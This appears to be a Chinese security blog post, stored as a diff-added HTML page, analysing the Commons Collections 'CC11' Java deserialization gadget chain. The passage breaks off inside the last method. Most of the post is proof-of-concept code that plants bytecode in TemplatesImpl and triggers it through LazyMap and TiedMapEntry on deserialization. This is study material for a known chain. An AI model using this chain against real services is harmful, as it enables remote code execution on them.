@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言 环境依旧还是 CommonsCollections 3.1-3.2.1 像是 cc2 和 cc6 的杂交，除了 CC1-7 的链子，剩下的链子都可以通过结合产生 CC-N。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;Java反序列化-cc11&#39;">
+<meta property="og:url" content="https://sunian19.github.io/2022/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc11/index.html">
+<meta property="og:site_name" content="zer0_c|imb&#39;s blog">
+<meta property="og:description" content="前言 环境依旧还是 CommonsCollections 3.1-3.2.1 像是 cc2 和 cc6 的杂交，除了 CC1-7 的链子，剩下的链子都可以通过结合产生 CC-N。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java183.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java184.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java185.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java186.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java188.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java187.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java189.png">
+<meta property="article:published_time" content="2022-11-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-10T17:00:33.810Z">
+<meta property="article:author" content="zer0_c|imb">
+<meta property="article:tag" content="java安全系列">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunian19.github.io/imgss/java183.png">
+
+
+<link rel="canonical" href="https://sunian19.github.io/2022/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc11/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunian19.github.io/2022/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc11/","path":"2022/11/09/java反序列化-cc11/","title":"'Java反序列化-cc11'"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>'Java反序列化-cc11' | zer0_c|imb's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?48584c486973b4bf025a425c3d7b4007"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">zer0_c|imb's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#qian-yan"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#li-yong-lian-fen-xi"><span class="nav-number">2.</span> <span class="nav-text">利用链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cc-2-de-wei-bu-lian-zi-templates-impl-lian"><span class="nav-number">2.1.</span> <span class="nav-text">cc2的尾部链子(TemplatesImpl 链)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ran-hou-kan-cc-6-de-lazy-map"><span class="nav-number">2.2.</span> <span class="nav-text">然后看cc6的lazyMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ran-hou-zai-kan-cc-6-de-ru-kou-bu-fen"><span class="nav-number">2.3.</span> <span class="nav-text">然后再看cc6的入口部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bu-dai-transformer-shu-zu-de-cc-11-lian-zi"><span class="nav-number">3.</span> <span class="nav-text">不带 Transformer 数组的 CC11 链子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zui-zhong-lian-zi-ru-kou-lei"><span class="nav-number">4.</span> <span class="nav-text">最终链子(入口类)</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zer0_c|imb"
+      src="/imgss/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">zer0_c|imb</p>
+  <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://hackergu.com/" title="http:&#x2F;&#x2F;hackergu.com&#x2F;" rel="noopener" target="_blank">Gu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://al0neranger.github.io/" title="https:&#x2F;&#x2F;al0neranger.github.io&#x2F;" rel="noopener" target="_blank">al0neranger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/lyshark" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;lyshark" rel="noopener" target="_blank">lyshark</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2022/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc11/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="zer0_c|imb">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0_c|imb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          'Java反序列化-cc11'
+        </h1>
+
+
+        <div class="post-meta">
+        
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-09 00:00:00" itemprop="dateCreated datePublished" datetime="2022-11-09T00:00:00+08:00">2022-11-09</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-11-11 01:00:33" itemprop="dateModified" datetime="2022-11-11T01:00:33+08:00">2022-11-11</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">java安全系列</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="qian-yan" id="前言">前言</h3>
+<p>环境依旧还是 CommonsCollections 3.1-3.2.1</p>
+<p>像是 cc2 和 cc6 的杂交，除了 CC1-7 的链子，剩下的链子都可以通过结合产生 CC-N。</p>
+<a id="more"></a>
+<h3 id="li-yong-lian-fen-xi" id="利用链分析">利用链分析</h3>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">       java.util.HashSet.readObject()</span><br><span class="line">           java.util.HashMap.put()</span><br><span class="line">           java.util.HashMap.hash()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                   org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                       org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                       java.lang.reflect.Method.invoke()</span><br><span class="line">                           ... templates gadgets ...</span><br><span class="line">                               java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure></div>
+<h4 id="cc-2-de-wei-bu-lian-zi-templates-impl-lian" id="cc2的尾部链子-TemplatesImpl-链">cc2的尾部链子(TemplatesImpl 链)</h4>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java183.png" alt=""></p>
+<h4 id="ran-hou-kan-cc-6-de-lazy-map" id="然后看cc6的lazyMap">然后看cc6的lazyMap</h4>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">               instantiateTransformer</span><br><span class="line">       &#125;;</span><br><span class="line">       ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       Map LazydecorateMap = LazyMap.decorate(objectObjectHashMap, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">       TiedMapEntry TiedMapget = <span class="keyword">new</span> TiedMapEntry(LazydecorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<p>结合使用，调用getValue<br>
+instantiateTransformer 改为 InvokerTransformer</p>
+<p>代码如下:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map LazydecorateMap = LazyMap.decorate(objectObjectHashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry TiedMapget = <span class="keyword">new</span> TiedMapEntry(LazydecorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        TiedMapget.getValue();</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java184.png" alt=""></p>
+<h4 id="ran-hou-zai-kan-cc-6-de-ru-kou-bu-fen" id="然后再看cc6的入口部分">然后再看cc6的入口部分</h4>
+<p><img src="/imgss/java185.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC11Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="comment">//调用TemplatesImpl的newTransformer()方法</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map LazydecorateMap = LazyMap.decorate(objectObjectHashMap, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">         <span class="comment">//利用LazyMap的get()来触发transform()。TiedMapEntry类的getValue()调用LazyMap的get()方法</span></span><br><span class="line"></span><br><span class="line">        TiedMapEntry TiedMapget = <span class="keyword">new</span> TiedMapEntry(LazydecorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="comment">// TiedMapget.getValue();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; HashMap1 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        HashMap1.put(TiedMapget,<span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line">        LazydecorateMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryField = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryField.set(LazydecorateMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(HashMap1);</span></span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span 